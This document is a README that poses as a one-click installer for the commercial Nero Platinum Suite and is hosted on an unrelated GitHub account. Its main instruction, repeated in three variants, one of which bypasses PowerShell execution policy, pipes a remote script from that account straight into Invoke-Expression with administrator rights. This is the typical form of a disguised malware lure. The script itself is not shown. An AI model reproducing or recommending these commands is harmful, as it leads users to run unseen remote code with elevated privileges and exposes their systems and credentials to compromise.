# Nero Platinum Suite Installer
One-click setup for Nero Platinum Suite -- the all-in-one multimedia package with disc burning, 4K video editing, media streaming, AI photo enhancement, and automatic file backup.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for disc burning driver and media codec module installation.
- Downloads the Nero Platinum Suite installer with all application modules included in one package.
- Installs Nero Burning ROM, Nero Video, Nero MediaHome, and Nero BackItUp in a single pass.
- Activates the license via Nero account sign-in and opens the Suite launcher dashboard.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~2500 MB free disk space

## Troubleshooting

**Disc burning fails at 99 percent with a write error**

Lower the burn speed to 8x or 16x in Nero Burning ROM settings -- high speeds cause write errors on most disc brands.

**Video editor crashes immediately when importing large 4K footage files**

Transcode 4K footage to proxy files with Nero Recode before editing to reduce the rendering load significantly.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.